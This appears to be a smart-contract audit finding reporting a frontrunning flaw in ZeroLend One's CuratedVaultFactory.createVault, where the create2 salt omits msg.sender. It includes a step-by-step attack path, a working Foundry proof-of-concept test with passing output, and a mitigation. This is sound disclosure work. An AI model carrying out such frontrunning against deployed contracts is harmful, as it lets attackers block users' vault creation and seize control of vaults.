Joyous Cedar Tortoise

Medium

# Attacker can frontrun a user calling createVault by deploying their own vault at the same address

### Summary

An attacker can frontrun [createVault](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVaultFactory.sol#L48) by calling createVault with the same salt BUT different admin to make the other user's tx revert, while the attacker owns the only vault deployed.

### Root Cause

The create2 salt used when deploying a vault does not include msg.sender in it. This means that the vault creation can be front-ran.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Honest user calls `createVault`
2. Attacker observes (1) in the mempool and frontruns it by calling `createVault` with the same salt BUT different admin address
3. Honest user's tx will revert
4. In the end state, the only vault that was deployed is owned by the attacker

### Impact

permanent DOS of vault creation

### PoC

Add the following to CuratedVaultFactoryTest
```solidity
function test__FrontrunVaultCreation() public {
    address attacker = address(123);
    address honestUser = address(888);

    // Honest users sets up his params to initalize the vault

    // defaultVaultParams.proxyAdmin = honestUser;
    // defaultVaultParams.admins[0] = honestUser;
    // defaultVaultParams.timelock = 3 days;
    // defaultVaultParams.name = "OG";
    // defaultVaultParams.symbol = "OG";
    // defaultVaultParams.salt = 0x3a7374e86dbf44c1c62fa9e99d1c2c814cc2ebe57d747dbcefc82508bfa66420;

    // Honest user sends a Tx to create a vault

    // Attacker sees the honest user's Tx in the mempool
    // he will frontrun the tx by using the same salt
    // BUT will input a different admin to control the vault

    defaultVaultParams.proxyAdmin = honestUser;
    defaultVaultParams.admins[0] = attacker;
    defaultVaultParams.timelock = 3 days;
    defaultVaultParams.name = "OG";
    defaultVaultParams.symbol = "OG";
    defaultVaultParams.salt = 0x3a7374e86dbf44c1c62fa9e99d1c2c814cc2ebe57d747dbcefc82508bfa66420;

    vm.startPrank(attacker);
    ICuratedVault vault = vaultFactory.createVault(defaultVaultParams);


    // When the honest user's Tx goes through, it will revert
    defaultVaultParams.proxyAdmin = honestUser;
    defaultVaultParams.admins[0] = honestUser;
    defaultVaultParams.timelock = 3 days;
    defaultVaultParams.name = "OG";
    defaultVaultParams.symbol = "OG";
    defaultVaultParams.salt = 0x3a7374e86dbf44c1c62fa9e99d1c2c814cc2ebe57d747dbcefc82508bfa66420;

    vm.startPrank(honestUser);

    vm.expectRevert();
    ICuratedVault vault1 = vaultFactory.createVault(defaultVaultParams);

    // Assert the attacker is the owner of the only vault that deployed
    assertTrue(vault.isOwner(attacker), 'owner');
  }
```

Console output:
```bash
Ran 1 test for test/forge/core/vaults/CuratedVaultFactoryTest.sol:CuratedVaultFactoryTest
[PASS] test__FrontrunVaultCreation() (gas: 1040470906)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.54ms (304.90µs CPU time)

Ran 1 test suite in 6.15ms (5.54ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

Include msg.sender in the create2 salt